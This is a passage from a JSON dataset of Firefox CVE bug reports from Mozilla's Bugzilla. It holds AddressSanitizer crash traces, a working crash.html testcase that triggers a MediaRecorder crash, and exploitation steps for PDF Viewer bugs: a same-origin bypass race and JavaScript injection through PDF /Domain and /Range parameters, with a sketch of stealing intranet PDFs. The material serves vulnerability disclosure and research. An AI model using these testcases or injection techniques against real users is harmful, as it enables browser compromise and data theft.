FlushPendingNotifications /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:579:5 #11 0x7fa83f3e33c8 in nsIDocument::FlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/dom/base/nsDocument.cpp:7649 #12 0x7fa8438218af in nsSMILAnimationController::DoSample(bool) /builds/worker/workspace/build/src/dom/smil/nsSMILAnimationController.cpp:440:15 #13 0x7fa84337257b in Resample /builds/worker/workspace/build/src/dom/smil/nsSMILAnimationController.h:74:21 #14 0x7fa84337257b in FlushResampleRequests /builds/worker/workspace/build/src/dom/smil/nsSMILAnimationController.h:90 #15 0x7fa84337257b in FlushAnimations /builds/worker/workspace/build/src/dom/svg/nsSVGElement.cpp:2677 #16 0x7fa84337257b in nsSVGEnum::DOMAnimatedEnum::AnimVal() /builds/worker/workspace/build/src/dom/svg/nsSVGEnum.h:97 #17 0x7fa844a7bf5d in SVGTextFrame::DoTextPathLayout() /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5099:31 #18 0x7fa844a7fdb5 in SVGTextFrame::DoGlyphPositioning() /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5365:3 #19 0x7fa844a82ce8 in UpdateGlyphPositioning /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5433:5 #20 0x7fa844a82ce8 in SVGTextFrame::TransformFrameRectFromTextChild(nsRect const&, nsIFrame*) /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5734 #21 0x7fa844528b3c in nsLayoutUtils::TransformFrameRectToAncestor(nsIFrame*, nsRect const&, nsIFrame const*, bool*, mozilla::Maybe<mozilla::gfx::Matrix4x4TypedFlagged<mozilla::gfx::UnknownUnits, mozilla::gfx::UnknownUnits> >*, bool, nsIFrame**) /builds/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3139:27 #22 0x7fa84472631a in IsFrameScrolledOutOfView(nsIFrame*, nsRect const&, nsIFrame*) /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:11026:5 #23 0x7fa844726190 in nsIFrame::IsScrolledOutOfView() /builds/worker/workspace/build/src/layout/generic/nsFrame.cpp:11057:10 #24 0x7fa83ef594a8 in mozilla::dom::KeyframeEffectReadOnly::CanThrottle() const /builds/worker/workspace/build/src/dom/animation/KeyframeEffectReadOnly.cpp:1172:16 #25 0x7fa83ef345d2 in mozilla::dom::KeyframeEffectReadOnly::NotifyAnimationTimingUpdated() /builds/worker/workspace/build/src/dom/animation/KeyframeEffectReadOnly.cpp:134:7 #26 0x7fa83ef32775 in mozilla::dom::Animation::UpdateTiming(mozilla::dom::Animation::SeekFlag, mozilla::dom::Animation::SyncNotifyFlag) /builds/worker/workspace/build/src/dom/animation/Animation.cpp:1346:3 #27 0x7fa83ef2c0f1 in mozilla::dom::Animation::Tick() /builds/worker/workspace/build/src/dom/animation/Animation.cpp:699:3 #28 0x7fa844382440 in mozilla::dom::CSSTransition::Tick() /builds/worker/workspace/build/src/layout/style/nsTransitionManager.cpp:337:14 #29 0x7fa83ef44afe in mozilla::dom::DocumentTimeline::WillRefresh(mozilla::TimeStamp) /builds/worker/workspace/build/src/dom/animation/DocumentTimeline.cpp:184:16 #30 0x7fa844396517 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1884:12 #31 0x7fa8443a6a00 in TickDriver /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:338:13 #32 0x7fa8443a6a00 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:308 #33 0x7fa8443a65c6 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:330:5 #34 0x7fa8443a933e in RunRefreshDrivers /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:771:5 #35 0x7fa8443a933e in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:684 #36 0x7fa8443a8f3e in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:585:9 #37 0x7fa844c56e9f in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /builds/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:68:16 #38 0x7fa83d7cc550 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:156:20 #39 0x7fa83d6b73d4 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1968:28 #40 0x7fa83d25583e in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2135:25 previously allocated by thread T0 (file:// Content) here: #0 0x4c1c93 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x7fa83ec6d177 in gfxTextRun::AllocateStorageForTextRun(unsigned long, unsigned int) /builds/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:128:21 #2 0x7fa8448a771a in Create /builds/worker/workspace/build/src/layout/generic/nsTextRunTransformations.cpp:51:19 #3 0x7fa8448a771a in MakeTextRun /builds/worker/workspace/build/src/layout/generic/nsTextRunTransformations.cpp:114 #4 0x7fa8448a771a in nsTransformingTextRunFactory::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, gfxFontGroup*, mozilla::gfx::ShapedTextFlags, nsTextFrameUtils::Flags, nsTArray<RefPtr<nsTransformedCharStyle> >&&, bool) /builds/worker/workspace/build/src/layout/generic/nsTextRunTransformations.cpp:131 #5 0x7fa8448a1fb7 in BuildTextRunsScanner::BuildTextRunForFrames(void*) /builds/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:2396:38 #6 0x7fa84489b718 in BuildTextRunsScanner::FlushFrames(bool, bool) /builds/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1699:17 #7 0x7fa8448ac9a7 in BuildTextRuns /builds/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1625:11 #8 0x7fa8448ac9a7 in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, mozilla::gfx::DrawTarget*, nsIFrame*, nsLineList_iterator const*, unsigned int*) /builds/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:2864 #9 0x7fa8448eadac in nsTextFrame::AddInlinePrefISizeForFlow(gfxContext*, nsIFrame::InlinePrefISizeData*, nsTextFrame::TextRunType) /builds/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8728:5 #10 0x7fa8448ecafa in nsTextFrame::AddInlinePrefISize(gfxContext*, nsIFrame::InlinePrefISizeData*) /builds/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8864:10 #11 0x7fa84462c5fe in nsBlockFrame::GetPrefISize(gfxContext*) /builds/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:860:16 #12 0x7fa844a80936 in SVGTextFrame::DoReflow() /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5520:29 #13 0x7fa844a67e96 in MaybeReflowAnonymousBlockChild /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:5475:5 #14 0x7fa844a67e96 in SVGTextFrame::ReflowSVG() /builds/worker/workspace/build/src/layout/svg/SVGTextFrame.cpp:3772 #15 0x7fa844a68fc9 in nsSVGDisplayContainerFrame::ReflowSVG() /builds/worker/workspace/build/src/layout/svg/nsSVGContainerFrame.cpp:350:17 #16 0x7fa844ace528 in nsSVGOuterSVGFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/svg/nsSVGOuterSVGFrame.cpp:455:14 #17 0x7fa844694f76 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:940:14 #18 0x7fa8446937bd in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:713:5 #19 0x7fa844694f76 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, mozilla::WritingMode const&, mozilla::LogicalPoint const&, nsSize const&, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:940:14 #20 0x7fa844770818 in nsHTMLScrollFrame::ReflowScrolledFrame(mozilla::ScrollReflowInput*, bool, bool, mozilla::ReflowOutput*, bool) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:554:3 #21 0x7fa844771c39 in nsHTMLScrollFrame::ReflowContents(mozilla::ScrollReflowInput*, mozilla::ReflowOutput const&) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:677:3 #22 0x7fa844775c18 in nsHTMLScrollFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/nsGfxScrollFrame.cpp:1054:3 #23 0x7fa84461551e in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, int, int, unsigned int, nsReflowStatus&, nsOverflowContinuationTracker*) /builds/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:984:14 #24 0x7fa844614099 in mozilla::ViewportFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&, mozilla::ReflowInput const&, nsReflowStatus&) /builds/worker/workspace/build/src/layout/generic/ViewportFrame.cpp:335:7 #25 0x7fa8443f3681 in mozilla::PresShell::DoReflow(nsIFrame*, bool) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:8838:11 #26 0x7fa8444090d0 in mozilla::PresShell::ProcessReflowCommands(bool) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:9011:24 #27 0x7fa8444074f3 in mozilla::PresShell::DoFlushPendingNotifications(mozilla::ChangesToFlush) /builds/worker/workspace/build/src/layout/base/PresShell.cpp:4309:11 #28 0x7fa844396ecd in FlushPendingNotifications /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIPresShell.h:579:5 #29 0x7fa844396ecd in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1939 #30 0x7fa8443a1354 in nsRefreshDriver::FinishedWaitingForTransaction() /builds/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:2163:5 #31 0x7fa83e9422b3 in mozilla::layers::ClientLayerManager::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /builds/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:532:32 #32 0x7fa8436ffd1b in mozilla::dom::TabChild::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /builds/worker/workspace/build/src/dom/ipc/TabChild.cpp:3127:7 #33 0x7fa83ea3449a in mozilla::layers::CompositorBridgeChild::RecvDidComposite(unsigned long const&, unsigned long const&, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /builds/worker/workspace/build/src/gfx/layers/ipc/CompositorBridgeChild.cpp:548:14 #34 0x7fa83d9f9e09 in mozilla::layers::PCompositorBridgeChild::OnMessageReceived(IPC::Message const&) /builds/worker/workspace/build/src/obj-firefox/ipc/ipdl/PCompositorBridgeChild.cpp:1401:20 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/obj-firefox/dist/include/gfxTextRun.h:113:16 in IsClusterStart Shadow bytes around the buggy address: 0x0c248001e290: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248001e2a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c248001e2b0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c248001e2c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248001e2d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa =>0x0c248001e2e0: fa fa fa fa fa fa fa fa fd fd fd fd fd[fd]fd fd 0x0c248001e2f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248001e300: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa 0x0c248001e310: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c248001e320: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248001e330: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==15139==ABORTING"
      }
    ],
    "CVE-2018-5156": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1453127",
        "title": "SEGV in mozilla::MediaEncoder::AudioTrackListener::NotifyRealtimeTrackData",
        "description": "The following testcase crashes the latest ASAN build of Firefox 61.0a1 (SourceStamp=30d72755b1749953d438199456f1524ce84ab5e5). It requires the three attached media files in the same directory and might require a few attempts to trigger. It works best for me when loaded from a file:// location, however I also managed to reproduce from a HTTP server. crash.html <script> function spin () { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org\",false); try{x.send(\"X\");}catch(e){} } function start() { o208=document.createElementNS('http://www.w3.org/1999/xhtml','video'); o208.autoplay=true; o208.setAttribute('src','1.ogg'); o208.onplaying=fun0; spin(); o379=o208.mozCaptureStreamUntilEnded(); o208.setAttribute('src','2.webm'); window.setTimeout(\"location.reload()\",400); } function fun0() { try{o573=new MediaRecorder(o379);}catch(e){} o208.setAttribute('src','3.webm'); try{o573.start();}catch(e){} } </script> <body onload=\"start()\"></body> ASAN output: AddressSanitizer:DEADLYSIGNAL ================================================================= ==13484==ERROR: AddressSanitizer: SEGV on unknown address 0x00009fff8000 (pc 0x7fd41288058a bp 0x7fd3f3fd8ff0 sp 0x7fd3f3fd8fa0 T304) ==13484==The signal is caused by a READ memory access. #0 0x7fd412880589 in Length /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:369:43 #1 0x7fd412880589 in AppendElements<const void *, nsTArrayInfallibleAllocator, nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1637 #2 0x7fd412880589 in AutoTArray /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2457 #3 0x7fd412880589 in AudioChunk /builds/worker/workspace/build/src/dom/media/AudioSegment.h:161 #4 0x7fd412880589 in Construct<const mozilla::AudioChunk &> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:539 #5 0x7fd412880589 in mozilla::AudioChunk* nsTArray_Impl<mozilla::AudioChunk, nsTArrayInfallibleAllocator>::AppendElement<mozilla::AudioChunk const&, nsTArrayInfallibleAllocator>(mozilla::AudioChunk const&) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2291 #6 0x7fd41287febb in mozilla::MediaSegmentBase<mozilla::AudioSegment, mozilla::AudioChunk>::AppendSliceInternal(mozilla::MediaSegmentBase<mozilla::AudioSegment, mozilla::AudioChunk> const&, long, long) /builds/worker/workspace/build/src/obj-firefox/dist/include/MediaSegment.h:512:19 #7 0x7fd41746dd94 in AppendSlice /builds/worker/workspace/build/src/obj-firefox/dist/include/MediaSegment.h:277:5 #8 0x7fd41746dd94 in mozilla::MediaEncoder::AudioTrackListener::NotifyRealtimeTrackData(mozilla::MediaStreamGraph*, long, mozilla::MediaSegment const&) /builds/worker/workspace/build/src/dom/media/encoder/MediaEncoder.cpp:150 #9 0x7fd41746cc86 in mozilla::MediaEncoder::AudioTrackListener::NotifyQueuedChanges(mozilla::MediaStreamGraph*, long, mozilla::MediaSegment const&) /builds/worker/workspace/build/src/dom/media/encoder/MediaEncoder.cpp:123:7 #10 0x7fd417074766 in mozilla::TrackUnionStream::CopyTrackData(mozilla::StreamTracks::Track*, unsigned int, long, long, bool*) /builds/worker/workspace/build/src/dom/media/TrackUnionStream.cpp:355:22 #11 0x7fd417072425 in mozilla::TrackUnionStream::ProcessInput(long, long, unsigned int) /builds/worker/workspace/build/src/dom/media/TrackUnionStream.cpp:122:11 #12 0x7fd417367045 in mozilla::MediaStreamGraphImpl::Process() /builds/worker/workspace/build/src/dom/media/MediaStreamGraph.cpp:1271:15 #13 0x7fd417368014 in mozilla::MediaStreamGraphImpl::OneIteration(long) /builds/worker/workspace/build/src/dom/media/MediaStreamGraph.cpp:1357:3 #14 0x7fd4170fa844 in mozilla::ThreadedDriver::RunThread() /builds/worker/workspace/build/src/dom/media/GraphDriver.cpp:319:40 #15 0x7fd417124552 in mozilla::MediaStreamGraphInitThreadRunnable::Run() /builds/worker/workspace/build/src/dom/media/GraphDriver.cpp:194:14 #16 0x7fd410cb3f18 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1096:14 #17 0x7fd410cd0350 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:519:10 #18 0x7fd411ba544b in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:334:20 #19 0x7fd411af4229 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #20 0x7fd411af4229 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #21 0x7fd411af4229 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #22 0x7fd410cae368 in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:425:11 #23 0x7fd42e1d647e in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #24 0x7fd431b636b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9) #25 0x7fd430bec3dc in clone (/lib/x86_64-linux-gnu/libc.so.6+0x1073dc) AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:369:43 in Length Thread T304 (MediaStreamGrph) created by T303 (CubebOp~tion #1) here: #0 0x4ae80d in __interceptor_pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:204:3 #1 0x7fd42e1d31cf in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14 #2 0x7fd42e1d2dbe in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12 #3 0x7fd410cb02e3 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:612:8 #4 0x7fd410cb9eca in nsThreadManager::NewNamedThread(nsTSubstring<char> const&, unsigned int, nsIThread**) /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:471:22 #5 0x7fd410cca454 in NS_NewNamedThread(nsTSubstring<char> const&, nsIThread**, nsIRunnable*, unsigned int) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:143:45 #6 0x7fd4170f9a25 in NS_NewNamedThread<16> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:72:10 #7 0x7fd4170f9a25 in mozilla::ThreadedDriver::Start() /builds/worker/workspace/build/src/dom/media/GraphDriver.cpp:210 #8 0x7fd4170fc950 in mozilla::AudioCallbackDriver::Init() /builds/worker/workspace/build/src/dom/media/GraphDriver.cpp:625:5 #9 0x7fd4170fbd34 in mozilla::AsyncCubebTask::Run() /builds/worker/workspace/build/src/dom/media/GraphDriver.cpp:495:21 #10 0x7fd410ccb05c in nsThreadPool::Run() /builds/worker/workspace/build/src/xpcom/threads/nsThreadPool.cpp:228:14 #11 0x7fd410ccb75c in non-virtual thunk to nsThreadPool::Run() /builds/worker/workspace/build/src/xpcom/threads/nsThreadPool.cpp #12 0x7fd410cb3f18 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1096:14 #13 0x7fd410cd0350 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:519:10 #14 0x7fd411ba55cc in mozilla::ipc::MessagePumpForNonMainThreads::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:364:5 #15 0x7fd411af4229 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #16 0x7fd411af4229 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #17 0x7fd411af4229 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #18 0x7fd410cae368 in nsThread::ThreadFunc(void*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:425:11 #19 0x7fd42e1d647e in _pt_root /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:201:5 #20 0x7fd431b636b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9) Thread T303 (CubebOp~tion #1) created by T0 (file:// Content) here: #0 0x4ae80d in __interceptor_pthread_create /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_interceptors.cc:204:3 #1 0x7fd42e1d31cf in _PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:433:14 #2 0x7fd42e1d2dbe in PR_CreateThread /builds/worker/workspace/build/src/nsprpub/pr/src/pthreads/ptthread.c:518:12 #3 0x7fd410cb02e3 in nsThread::Init(nsTSubstring<char> const&) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:612:8 #4 0x7fd410cb9eca in nsThreadManager::NewNamedThread(nsTSubstring<char> const&, unsigned int, nsIThread**) /builds/worker/workspace/build/src/xpcom/threads/nsThreadManager.cpp:471:22 #5 0x7fd410cc9dbf in NS_NewNamedThread /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:143:45 #6 0x7fd410cc9dbf in nsThreadPool::PutEvent(already_AddRefed<nsIRunnable>, unsigned int) /builds/worker/workspace/build/src/xpcom/threads/nsThreadPool.cpp:109 #7 0x7fd410ccb916 in nsThreadPool::Dispatch(already_AddRefed<nsIRunnable>, unsigned int) /builds/worker/workspace/build/src/xpcom/threads/nsThreadPool.cpp:277:5 #8 0x7fd4170ff953 in Dispatch /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIEventTarget.h:37:14 #9 0x7fd4170ff953 in Dispatch /builds/worker/workspace/build/src/dom/media/GraphDriver.h:583 #10 0x7fd4170ff953 in mozilla::AudioCallbackDriver::Start() /builds/worker/workspace/build/src/dom/media/GraphDriver.cpp:748 #11 0x7fd417369bba in mozilla::MediaStreamGraphImpl::RunInStableState(bool) /builds/worker/workspace/build/src/dom/media/MediaStreamGraph.cpp:1693:17 #12 0x7fd41738e48f in mozilla::(anonymous namespace)::MediaStreamGraphStableStateRunnable::Run() /builds/worker/workspace/build/src/dom/media/MediaStreamGraph.cpp:1548:15 #13 0x7fd410b0a6c0 in mozilla::CycleCollectedJSContext::ProcessStableStateQueue() /builds/worker/workspace/build/src/xpcom/base/CycleCollectedJSContext.cpp:312:12 #14 0x7fd410b0c855 in mozilla::CycleCollectedJSContext::AfterProcessTask(unsigned int) /builds/worker/workspace/build/src/xpcom/base/CycleCollectedJSContext.cpp:377:3 #15 0x7fd412569d5d in XPCJSContext::AfterProcessTask(unsigned int) /builds/worker/workspace/build/src/js/xpconnect/src/XPCJSContext.cpp:1252:30 #16 0x7fd410cb49e3 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1133:24 #17 0x7fd410cd0350 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:519:10 #18 0x7fd411ba445a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #19 0x7fd411af4229 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #20 0x7fd411af4229 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #21 0x7fd411af4229 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #22 0x7fd418815eba in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #23 0x7fd41cad7edb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22 #24 0x7fd411af4229 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #25 0x7fd411af4229 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #26 0x7fd411af4229 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #27 0x7fd41cad78a2 in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:719:34 #28 0x4f50dc in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #29 0x4f50dc in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #30 0x7fd430b0582f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) ==13484==ABORTING"
      }
    ],
    "CVE-2018-5157": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1449898",
        "title": "Race condition in PDF Viewer allows circumventing same-origin policy for PDF files",
        "description": "When a PDF file opens in the built-in PDF Viewer, the stream converter will retrieve the file data and post it as a message to the viewer (see https://dxr.mozilla.org/mozilla-central/rev/a456475502b80a1264642d9eaee9394a8fad8315/browser/extensions/pdfjs/content/PdfStreamConverter.jsm#605). When doing this, it specifies \"*\" as the recipient's origin. So if the PDF Viewer got replaced by another document in the meantime, that other document will receive the message. Steps to reproduce: 1. Open the attached proof of concept page. 2. Enter the URL of a PDF file into the text field and click \"Download\" 3. Wait a bit. When testing with https://www.microsoft.com/en-us/research/wp-content/uploads/2006/11/www2007.pdf, this page succeeds within a few seconds for me and displays the first 160 bytes of the PDF file. It does that by loading the PDF in a hidden frame first to make sure that it is cached. After that it will repeatedly load the PDF file in a frame, then replace the frame contents by about:blank after a random time interval. I am not entirely sure why it doesn't work reliably with other PDF files for me, but with some tweaks to the timing it should be possible. So a malicious website should be able to retrieve PDF files in the background that only the website visitor can access. That might be documents on the intranet for example, or private documents on some storage service. I tested with Firefox 59.0.2 and Firefox 61.0a1 (2018-03-28) nightly on Linux."
      }
    ],
    "CVE-2018-5158": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1452075",
        "title": "PDF Viewer will run code from PDF files, missing validation for /Domain and /Range parameters",
        "description": "PDF Viewer will convert PostScript calculator functions to JavaScript. While the PostScript code itself is being validated thoroughly, for the Domain and Range parameters in the PDF file the code will only verify that these are arrays (see https://dxr.mozilla.org/mozilla-central/rev/2f5ffe4fa2153a798ed8b310a597ea92abd1b868/browser/extensions/pdfjs/content/build/pdf.worker.js#20413). PostScriptCompiler will then insert the array entries into the generated JavaScript code verbatim assuming that these are numbers (as they should be per spec), a malicious PDF file can use strings to inject JavaScript code this way. Steps to reproduce: 1. Press Ctrl+Shift+J to open Browser Console. 2. Switch back to the browser and open the attached PDF file. 3. Check the Browser Console. In Firefox 59.0.2 and 61.0a1 (2018-04-06) nightly the following message shows up in Browser Console: \"Hello, this is code running in resource://pdf.js/build/pdf.worker.js.\" You can look at the text of the PDF file to see that the code being executed here is console.log(\"Hello, this is code running in \" + location.href). I did not implement additional exploit steps but code running in the worker can jump over to the viewer itself. For that it would send a malicious glyph to the viewer, you can see under https://dxr.mozilla.org/mozilla-central/rev/2f5ffe4fa2153a798ed8b310a597ea92abd1b868/browser/extensions/pdfjs/content/build/pdf.js#6354 that glyph data is being used to produce JavaScript code without further validation - this code assumes that validation happens in the worker. Once in the viewer, the code could trigger the ChromeActions API available to the viewer (see https://dxr.mozilla.org/mozilla-central/rev/2f5ffe4fa2153a798ed8b310a597ea92abd1b868/browser/extensions/pdfjs/content/PdfStreamConverter.jsm#191) and read/write preferences in the pdfjs.* namespace for example. Also, it could add iframe tags pointing to other PDF files (e.g. from intranet domains). Since PDF Viewer would load into these domains as well, it could access their contents (same-origin) and steal PDF data."
